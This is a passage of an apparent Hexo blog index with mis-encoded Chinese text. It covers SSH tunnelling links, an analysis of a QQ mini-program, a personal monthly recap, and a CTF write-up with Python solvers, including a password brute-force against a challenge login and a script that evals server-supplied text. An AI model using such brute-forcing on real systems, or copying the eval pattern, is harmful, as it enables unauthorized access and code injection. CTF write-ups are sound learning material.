href="https://www.jianshu.com/p/3cd2793ba719">åˆ©ç”¨é˜¿é‡Œäº‘ECSè·³æ¿æœºå†…ç½‘ç©¿é€- ssh</a> </li><li><a href="https://www.centos.bz/2017/08/ssh-reverse-proxy/">SSHå¦‚ä½•åå‘ä»£ç†ç¨³å®šç©¿é€å†…ç½‘</a></li><li><a href="https://zhuanlan.zhihu.com/p/57477087">å†…ç½‘ç©¿é€ï¼šåœ¨å…¬ç½‘è®¿é—®ä½ å®¶çš„ NAS</a>   ï¼ˆè¿˜åŒ…æ‹¬<code>frp</code>ç›¸å…³ï¼‰</li><li><a href="https://www.jianshu.com/p/85866b87c7d0">ä»å¤–ç½‘ SSH è¿›å±€åŸŸç½‘ï¼Œåå‘ä»£ç†+æ­£å‘ä»£ç†</a></li><li><a href="https://www.jianshu.com/p/7accc1e485d3">autossh ç©¿é€ï¼Œåå‘ä»£ç†åˆ°å†…ç½‘</a></li><li><a href="https://blog.csdn.net/liu_qingbo/article/details/78383892">ssh-copy-idä¸‰æ­¥å®ç°SSHæ— å¯†ç ç™»å½•å’Œsshå¸¸ç”¨å‘½ä»¤</a></li><li><a href="https://www.jianshu.com/p/a3aa6b01b2e1">Linux å‘½ä»¤ç¥å™¨ï¼šlsof</a></li><li><a href="https://www.oschina.net/translate/automatically-restart-ssh-sessions-and-tunnels-using-autossh">ä½¿ç”¨ autossh è‡ªåŠ¨é‡å¯ SSH ä¼šè¯å’Œé€šé“</a></li><li><a href="https://www.fcwys.cc/archives/371.html">CentOS7æ·»åŠ å¼€æœºå¯åŠ¨æœåŠ¡æˆ–è„šæœ¬</a></li></ol><p>etc.   </p><p>éå¸¸æ„Ÿè°¢ä¸Šé¢è¿™äº›æ–‡ç« ï¼Œç»™äº†æˆ‘å¾ˆå¤šå¯å‘å‘¢ã€‚  </p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> ssh </tag>
            
            <tag> VSCode </tag>
            
            <tag> è¿œç¨‹ </tag>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> Server </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°æƒ³æ³• | QQå°ç¨‹åºã€å¹´ç»ˆæŠ¥å‘Šå•/2019å¹´ç»ˆæ€»ç»“ã€‘åˆ†æ</title>
      <link href="2019/12/04/Scrapy_2019Year-end_Report/"/>
      <url>2019/12/04/Scrapy_2019Year-end_Report/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¼˜ç”±"><a href="#ç¼˜ç”±" class="headerlink" title="ç¼˜ç”±"></a>ç¼˜ç”±</h2><p>è¿™ä¸¤å¤©çœ‹ç©ºé—´å„ç§å‘ã€æˆ‘çš„2019å¹´ç»ˆæŠ¥å‘Šã€‘ï¼Œç„¶åæˆ‘ä¹Ÿå»æµ‹äº†ä¸€ä¸‹ï¼Œæ²¡æƒ³åˆ°å•¥ä¹Ÿä¸ç”¨å¡«ï¼Œç”³è¯·è·å–ä¸ªäººä¿¡æ¯çš„æƒé™ï¼ŒæŠ¥å‘Šå°±å‡ºæ¥äº†ã€‚  </p><p>ç„¶è€Œå¼¹å‡ºä¸€ä¸ªé®ç½©å±‚è®©ä½ å…ˆçœ‹ä¸ª15sçš„å¹¿å‘Šâ€¦â€¦  </p><p>è¶…æƒ³åæ§½ï¼ŒåŒ…æ‹¬é¡µé¢ä¸‹é¢çš„å¹¿å‘Šã€‚ã€‚  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/movie.png" alt="movie"></p><p>ç„¶åçœ‹å®Œå¹¿å‘Šï¼Œç»ˆäºå‡ºæ¥äº†ã€‚  </p><p>æ­£å½“æˆ‘æˆªäº†å›¾è¿”å›ä¹‹åï¼Œå™«æ¢ä¸ªæ€§åˆ«è¯•è¯•ã€‚  </p><p>å¥½ï¼Œè¿™å›ä¸ä¸€æ ·äº†å‘€ï¼  </p><p>ç„¶åå†æ¥ä¸€æ¬¡ï¼Œå™«ï¼Œåˆä¸ä¸€æ ·äº†â€¦â€¦è¿™è®©æˆ‘æ€€ç–‘ä»–å°±æ˜¯å‡çš„å‡ å¼ å›¾ç‰‡è€Œå·²å§ã€‚  </p><p>æˆ‘å…´è¶£æ¥äº†ï¼Œä¸å¦‚æ¥æŠ˜è…¾ä¸€ä¸‹ï¼Œåˆ†æä¸€ä¸‹è¿™ä¸ªå°ç¨‹åºå§ã€‚  </p><p>ï¼ˆä¸æŠ˜è…¾ä¼šæ­»â€¦â€¦</p><h2 id="å¼€å§‹æŠ˜è…¾"><a href="#å¼€å§‹æŠ˜è…¾" class="headerlink" title="å¼€å§‹æŠ˜è…¾"></a>å¼€å§‹æŠ˜è…¾</h2> <a id="more"></a> <h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>å…ˆæ¥çœ‹ä¸€çœ‹è¿™ä¸ªå°ç¨‹åºçš„è®¾ç½®ï¼Œå‘ç°åªè·å–äº†<strong>ç”¨æˆ·ä¿¡æ¯</strong>ã€‚çœ‹ä¸€çœ¼<strong>æ›´å¤šèµ„æ–™</strong>â€”â€”  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image1.png" alt="image1"></p><p>å…ˆç¡®å®šäº†è¿™æ˜¯ä¸ªä¸ªäººå¼€å‘çš„å°ç¨‹åºï¼Œçœ‹ç›¸å…³çš„åŸŸåé™¤äº†Tencentå®¶çš„ï¼Œä¸»è¦å°±æ˜¯<code>wxa.game-a1.cn</code> å’Œ<code>free-api.heweather.com</code>ã€‚  </p><p>æŸ¥äº†ä¸€ä¸‹ï¼Œåè€…æ˜¯ä¸€ä¸ªæŸ¥å¤©æ°”çš„APIï¼ˆéœ€è¦çš„è¯å¯ä»¥ç”¨ä¸€æ³¢ï¼‰<em>ï¼ˆå°±æ˜¯å¾ˆè¿·æƒ‘ä¸ºå•¥è¿™é‡Œä¼šæœ‰è¿™ä¸ª</em>  </p><p>å‰è€…æ˜¯ä¸€ä¸ªä¸ªäººçš„åŸŸåå§ï¼Œçœ‹æ ·å­æ˜¯ç”¨çš„ä¸€ä¸ªå¼€å‘å°ç¨‹åºçš„å¹³å°ã€‚æ ¹åŸŸåè¿˜æ˜¯ä¸ªåšå®¢ï¼Œé‡Œé¢è¿˜æœ‰æ­å»ºå¾®ä¿¡å°ç¨‹åºçš„ç»å†ã€‚</p><hr><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>pingäº†ä¸€ä¸‹è¿™ä¸ªåŸŸåï¼Œå¾—åˆ°IPï¼š<code>47.105.42.112</code>  </p><p>ç„¶åæŠ“äº†ä¸ªåŒ…ï¼Œè¿‡æ»¤åªçœ‹å…³äºè¿™ä¸ªIPçš„æ•°æ®åŒ…ã€‚å‘ç°æœ‰ä¸¤ä¸ªã€‚  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/Inked.jpg" alt="Inked"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image2.png" alt="2"></p><p>å‰é¢ä¸€ä¸ªä¸æ‡‚ä»€ä¹ˆé¬¼å¡«äº†ä¸ªè¡¨ï¼Œä¼°è®¡æ”¶é›†äº†ä¸€æ³¢ä½¿ç”¨æ•°æ®ï¼Œå…ˆä¸ç®¡ã€‚é‡ç‚¹æ˜¯åé¢è¿™ä¸ªã€‚</p><p>å¾ˆæ˜æ˜¾æ˜¯è®¿é—®äº†<code>http://wxa.game-a1.cn/wxa/qqnz2019/index.php</code>è¿™ä¸ªç½‘å€ã€‚</p><hr><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>æµè§ˆå™¨å¯åŠ¨ï¼ŒF12å¤§æ³•å¥½å‘€ã€‚  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image3.png" alt="image-20191204143118444"></p><p>å¥½ä¸€ä¸ªJSONå­—ç¬¦ä¸²ï¼Œæ¥åˆ†æä¸€ä¸‹å§ã€‚  </p><p><code>qrcode</code>å¾ˆæ˜æ˜¾æ˜¯äºŒç»´ç å•¦ï¼Œä¸‹è½½ä¸‹æ¥è§£ç å‘ç°è°ƒç”¨äº†qqå°ç¨‹åºçš„æ¥å£å§ï¼Œè®¿é—®ä¼šè·³è½¬åˆ°è¿™ä¸ªå°ç¨‹åºã€‚</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image4.png" alt="image-20191204143437363"></p><p><code>url</code>å’Œ<code>url1</code>éƒ½æ˜¯ä¸€æ ·çš„ï¼ŒæŒ‡å‘äº†ä¸€ä¸ªé˜¿é‡Œäº‘çš„å¯¹è±¡å­˜å‚¨ã€‚â†“</p><p><a href="https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png">https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png</a></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image5.png" alt="image-20191204143738991"></p><p>å¤šæ¬¡åˆ·æ–°å‘ç°å¥½åƒçš„ç¡®å°±é‚£å‡ å¼ å›¾ç‰‡ï¼Œæ”¹å˜äº†ä¸€ä¸‹<code>x.png</code>è€Œå·²ã€‚  </p><p>è€Œä¸”çš„ç¡®è¿™å°±æ˜¯å‡çš„å›¾å•¦ã€‚<em>ï¼ˆä¸ç„¶å“ªæ¥çš„ç”¨æˆ·æ•°æ®å¯ä»¥åˆ†æ</em>  </p><hr><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>æ—¢ç„¶éƒ½çŸ¥é“æ˜¯å‡ å¼ å›¾ç‰‡è€Œå·²äº†ï¼Œé‚£é¡ºä¾¿å°±çˆ¬ä¸‹æ¥å§ã€‚  </p><p>PyCharm å¯åŠ¨ï¼Œæ¥å†™ä¸€å†™jioæœ¬ã€‚  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/code.png" alt="image-20191204150348574"></p><p>å†™rangeæ˜¯å› ä¸ºéšä¾¿è¯•äº†ä¸€ä¸‹ï¼Œæœ¬æ¥å°±æ²¡æœ‰å‡ å¼ å›¾ç‰‡è€Œå·²ï¼Œç„¶è€Œæ‡’å¾—æ‰‹åŠ¨ä¸‹è½½ã€‚</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/download_imgs.png" alt="image-20191204144246023"></p><p>çœ‹ç»“æœçš„ç¡®å°±7å¼ å›¾ç‰‡ã€‚ã€‚</p><p>å‘å°±è¿™å‡ å¼ äº†â†“  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/1.png" alt="1"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/2.png" alt="2"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/3.png" alt="3"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/4.png" alt="4"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/5.png" alt="5"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/6.png" alt="6"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/7.png" alt="7"></p><hr><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>çœ‹æ ·å­å°ç¨‹åºè·å–ä¸ªäººå¤´åƒï¼Œç„¶åå†å’ŒäºŒç»´ç ã€ä¸Šé¢çš„ä»»æ„ä¸€å¼ å›¾æ‹¼æ¥åœ¨ä¸€èµ·è€Œå·²å§ã€‚   </p><p>å°±æ˜¯è¿™ä¸ª<code>form.php</code>ï¼Œçœ‹æ ·å­æ˜¯ç”¨æ¥ç»Ÿè®¡ä½¿ç”¨æ•°æ®çš„å§emmmé—®é¢˜ä¸å¤§ã€‚</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image6.png" alt="image-20191204144935029"></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å“‡å‘œæŠ˜è…¾äº†ä¸€ä¸ªä¸­åˆå¥½æ°”å•Šï¼Œ<del><em>ï¼ˆæœ‰æ¯’ ä¸æŠ˜è…¾ä¼šæ­»</em></del></p><p>ä¸ç®¡æ€ä¹ˆè¯´è¿™ä¸ªå°ç¨‹åºè¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ï¼Œè‡³å°‘åšçš„é‚£å‡ å¼ å›¾ç‰‡è¿˜æŒºä¸é”™çš„å“ˆå“ˆå“ˆã€‚</p><p>ä¸è¿‡è¦åæ§½è¿™ä¸ªå¹¿å‘Šè¶…çº§è®¨åŒemmm</p><p>å°±è¿™æ ·å§ã€‚</p><p>çˆ¬å–å›¾ç‰‡çš„æºç  å’Œ çˆ¬åˆ°çš„å›¾ç‰‡æ”¾åˆ°äº†Githubä¸Šäº†ï¼Œæœ‰éœ€è¦çš„å¯ä»¥å»çœ‹çœ‹å§ã€‚</p><p>URLï¼š<a href="https://github.com/miaotony/Scrapy_2019Year-end_Report">è¿™æ˜¯ç½‘å€</a></p><p><a href="https://github.com/miaotony/Scrapy_2019Year-end_Report">https://github.com/miaotony/Scrapy_2019Year-end_Report</a></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°æƒ³æ³• </tag>
            
            <tag> åˆ†æ </tag>
            
            <tag> Python </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> å°ç¨‹åº </tag>
            
            <tag> å¹´ç»ˆæ€»ç»“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çºªå¿µä¸€ä¸‹å¿™åˆ°çˆ†ç‚¸è¶…çº§éš¾é¡¶çš„åä¸€æœˆ</title>
      <link href="2019/12/02/Boom_2019November/"/>
      <url>2019/12/02/Boom_2019November/</url>
      
        <content type="html"><![CDATA[<h2 id="çºªå¿µä¸€ä¸‹å¿™åˆ°çˆ†ç‚¸è¶…çº§éš¾é¡¶çš„åä¸€æœˆ"><a href="#çºªå¿µä¸€ä¸‹å¿™åˆ°çˆ†ç‚¸è¶…çº§éš¾é¡¶çš„åä¸€æœˆ" class="headerlink" title="çºªå¿µä¸€ä¸‹å¿™åˆ°çˆ†ç‚¸è¶…çº§éš¾é¡¶çš„åä¸€æœˆ"></a>çºªå¿µä¸€ä¸‹å¿™åˆ°çˆ†ç‚¸è¶…çº§éš¾é¡¶çš„åä¸€æœˆ</h2><p><del>ï¼ˆå®åœ¨æ²¡å¿ä½</del><br>æœ¬æ¥å°±ä¸€å †äº‹ï¼Œç„¶è€Œæœ‰äº›æ´»åŠ¨è¿˜æƒ³å»ä½“éªŒä¸€ä¸‹ï¼Œä¸è¿‡æ”¶è·å€’æ˜¯ä¸å°‘å§<br><del>ï¼ˆå…¶å®åœ¨ä½œæ­»â€¦</del></p><p> <img src="/2019/12/02/Boom_2019November/plan.png" alt="plan"> </p> <a id="more"></a> <ul><li><p>ç”µç„Šå¤§èµ› åˆ’äº†ä¸€æ³¢æ°´  </p><p><img src="/2019/12/02/Boom_2019November/CircuitWeldingCompetition.jpg" alt="ç”µç„Šå¤§èµ›"></p></li><li><p>å’Œå¸ˆå‚…ä»¬ç©äº†ç©CTFï¼ˆä¸åŠ¡æ­£ä¸š<br>åˆ°äº†å¤§ä¸‰æ‰çŸ¥é“è¿™ä¸ªæ¯”èµ›å˜¤å˜¤å˜¤  å¤ªèœäº†ï¼Œåªæ‹¿äº†ç¬¬å…­ï¼Œä¸è¿‡æœ‰ä¸ªä¸€è¡€è¿˜æ‹¿äº†ä¸ªå¨ƒå¨ƒå˜»å˜»å˜»<br>ç„¶è€Œç„äº†ä¸€çœ¼NJUPT CTFé¢˜ç›®ï¼Œå‘ç°è‡ªå·±èœåˆ°çˆ†ç‚¸ã€‚äººå®¶å…‰æ˜¯ç­¾åˆ°é¢˜å°±ç»•äº†å¥½å‡ ä¸ªå¼¯â€¦   </p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF2.jpg" alt="ctf"></p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF.png" alt="ctf"></p></li><li><p>å»ä¸œå¤§æ‰“äº†ä¸€æ³¢Hackathonï¼ˆä¸åŠ¡æ­£ä¸š<br>æˆåŠŸå¸¦é£ä¿©å­¦å¼Ÿ æ‹¿äº†ç¬¬å›› ä¸‰ç­‰å¥–<br> ï¼ˆå¾®è½¯çˆ¸çˆ¸çœŸæœ‰é’±ï¼Œç™½å«–æ„Ÿè§‰è¶…çº§çˆ½233<br><img src="/2019/12/02/Boom_2019November/hackathon.JPG" alt="hackathon"><br><img src="/2019/12/02/Boom_2019November/hackathon3.png" alt="hackathon3"><br><img src="/2019/12/02/Boom_2019November/hackathon2.jpg" alt="hackathon2">   </p></li><li><p>åšäº†æŒç»­ä¸€ä¸ªæœˆçš„æ ¡ç”µèµ›<br>è¿™å›ç»ˆäºæ²¡æœ‰ç™½ç»™äº†ï¼Œä¸€ç­‰å¥–+æœ€ä½³å·¥ç¨‹å®è·µå¥–åˆ°æ‰‹  </p><p><img src="/2019/12/02/Boom_2019November/NUAAEDC.jpg" alt="NUAAEDC"></p></li></ul><p>æœŸé—´è¿˜æœ‰ç»“è¯¾è€ƒè¯•ï¼Œå‡†å¤‡å¤§åˆ›ä¸­æœŸææ–™ï¼Œå„ç§DDLï¼ŒçœŸå°±éš¾é¡¶åˆ°çˆ†ç‚¸æƒ³è‡ªé—­â€¦â€¦  </p><p>ä¸è¿‡è¦æ„Ÿè°¢è¶…çº§æ£’çš„å¥¶å†°æ—¥å¸¸é¼“åŠ±<br>æ²¡æœ‰å¥¶å†°çš„è¯åŒ…æ‹¬<code>iCal</code>åœ¨å†…å¾ˆå¤šäº‹çœŸå°±å¾ˆéš¾åšæŒä¸‹å»<br>è¿˜æŠ‘åˆ¶ä½äº†æˆ‘ä¸å°‘å†²åŠ¨233<br>è¿˜æœ‰é™†å¸ˆå‚…çš„<code>åšå¥½æˆ‘ä»¬çš„å°±è¡Œäº†</code><br>äºè€æ¿çš„<code>åŠ æ²¹å•Šä½ ä»¬éƒ½å¤§ä¸‰äº†</code><br>ç„°ç„°çš„<code>å…ˆåšå¥½å½“ä¸‹çš„äº‹</code><br>ä¸€å¸†å­¦å¼Ÿçš„<code>å†²å†²å†²</code><br>è¿˜æœ‰èˆå‹çš„é€šæƒ…è¾¾ç†<br>etc.  </p><h2 id="è½¬çœ¼é—´å°±åäºŒæœˆå•¦"><a href="#è½¬çœ¼é—´å°±åäºŒæœˆå•¦" class="headerlink" title="è½¬çœ¼é—´å°±åäºŒæœˆå•¦"></a>è½¬çœ¼é—´å°±åäºŒæœˆå•¦</h2><p>è¿™ä¸ªæœˆåº”è¯¥å°±æ²¡æœ‰æ¯”èµ›ä»€ä¹ˆçš„äº†ï¼Œä¸è¿‡é¡¹ç›®è¿›åº¦æœ‰ç©ºè¿˜å¾—èµ¶ä¸€èµ¶8<br>è¿˜è¦è¡¥è¯¾å†…æ¬ ä¸‹çš„ä¸€å †éš¾åˆ°çˆ†ç‚¸çœ‹ä¸æ‡‚çš„çŸ¥è¯†<br>è¿˜æœ‰å¤§ä½œä¸šã€è¯¾è®¾ã€å®éªŒï¼Œä»¥åŠæ¥ä¸‹æ¥å‡ å‘¨é™†ç»­ç»“è¯¾é©¬ä¸Šåˆ°æ¥çš„è€ƒè¯•â€¦â€¦<br>ï¼ˆå½“ç„¶æœ‰ç©ºçš„è¯è¿˜æƒ³å‡ºå»è½¬ä¸€è½¬ï¼ˆéƒ½å¥½ä¹…æ²¡å‡ºé—¨äº†å˜¤å˜¤å˜¤ é™¤äº†å»äº†è¶ŸSEU  </p><p>æ€»ä¹‹â€”â€”<br><strong>æ¥ä¸‹æ¥çš„ä¸¤ä¸ªæœˆåŠ æ²¹å†²å†²å†²ï¼</strong>  </p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Asuriæˆ˜é˜Ÿ 2019æ‹›æ–°èµ› WriteUP</title>
      <link href="2019/11/28/CTF_2019Asuri_Recruitment/"/>
      <url>2019/11/28/CTF_2019Asuri_Recruitment/</url>
      
        <content type="html"><![CDATA[<h1 id="Asuri-æ‹›æ–°èµ›WriteUP-20191117"><a href="#Asuri-æ‹›æ–°èµ›WriteUP-20191117" class="headerlink" title="Asuri æ‹›æ–°èµ›WriteUP 20191117"></a>Asuri æ‹›æ–°èµ›WriteUP 20191117</h1><p>ç½‘å€ï¼š <a href="http://139.9.212.218:8000/challenges">http://139.9.212.218:8000/challenges</a>  </p><p>å®˜æ–¹å®‰æ’åŠWriteUPï¼š<a href="https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp">https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp</a>  </p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p><code>flag{this_is_test_flag}</code> </p><h2 id="misc-ç­¾åˆ°"><a href="#misc-ç­¾åˆ°" class="headerlink" title="misc-ç­¾åˆ°"></a>misc-ç­¾åˆ°</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185210292.png" alt="misc"></p><p>base64è§£ç å³å¾—åˆ°</p><p><code>flag{1_want_jiamus_p0wer}</code>  </p><h2 id="baby-web-ä¹æ›²åå…«å¼¯"><a href="#baby-web-ä¹æ›²åå…«å¼¯" class="headerlink" title="baby-web-ä¹æ›²åå…«å¼¯"></a>baby-web-ä¹æ›²åå…«å¼¯</h2><p> <a href="http://desperadoccy.club:39011/">http://desperadoccy.club:39011/</a> </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185108626.png" alt="image-20191117185108626"></p><p>base64è§£ç </p><p><code>Asuri{view_source's_power}</code></p><h2 id="å¿«é€Ÿè®¡ç®—"><a href="#å¿«é€Ÿè®¡ç®—" class="headerlink" title="å¿«é€Ÿè®¡ç®—"></a>å¿«é€Ÿè®¡ç®—</h2><p> <a href="http://47.102.107.100:39012/">http://47.102.107.100:39012/</a> </p> <a id="more"></a> <p>è¿ç»­20æ¬¡åœ¨1-2så†…åˆ¤æ–­æ˜¯å¦æ­£ç¡®ï¼Œå³å¯å¾—åˆ°flagã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    equation <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;div&gt;(.*)=(.*)&lt;/div&gt;'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>equation<span class="token punctuation">)</span>    answer <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> answer <span class="token operator">==</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'true'</span><span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117195746861.png" alt="image-20191117195746861"></p><p><code>Asuri{python_1s_th3_be3t_l4ngu4ge}</code></p><h2 id="medium-web-justburp"><a href="#medium-web-justburp" class="headerlink" title="medium_web_justburp"></a>medium_web_justburp</h2><p> <a href="http://139.9.212.218:39010/">http://139.9.212.218:39010/</a> </p><p>æŸ¥æ‰¾ç½‘ç«™ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117204536434.png" alt="image-20191117204536434"></p><p>è®¿é—®<code>robots.txt</code> å¾—åˆ°ï¼š  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212248603.png" alt="image-20191117212248603"></p><p>è®¿é—®<code>hint.php</code> å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212350116.png" alt="image-20191117212350116"></p><p>å°è¯•ä»¥<code>admin</code>ä½œä¸ºç”¨æˆ·åï¼Œç”¨ä»¥ä¸Šä¿¡æ¯ä½œä¸ºå¯†ç å†™è„šæœ¬è¿›è¡Œç™»å½•ï¼Œ  </p><p>ç„¶è€Œå¥½åƒæ²¡æœ‰æˆåŠŸï¼ˆæœ‰å¯èƒ½æœ‰æˆåŠŸçš„æ²¡çœ‹åˆ°ï¼Ÿï¼Ÿï¼Ÿ  </p><blockquote><p>éš¾å—äº†ï¼Œç°åœºå†™çš„æ—¶å€™è„‘ä¹±äº†ï¼ŒæŠŠæ‰€æœ‰ç™»å½•æ•°æ®éƒ½æ‰“å°å‡ºæ¥äº†ï¼Œç„¶åæ²¡æ‰¾åˆ°flagâ€¦<br>åŠ ä¸€ä¸ªifé‡æ–°æ¥å°±çœ‹åˆ°äº†æƒ¹emmm</p></blockquote><p><strong>çˆ†ç ´ä¸€æ³¢</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'name-pass.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    contents <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># print(contents)</span>    passwords <span class="token operator">=</span> contents<span class="token keyword">for</span> password <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>    values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>              <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">,</span> params<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">if</span> <span class="token string">'å¯†ç é”™è¯¯'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>å³å¯å¾—åˆ°</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Hi hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token 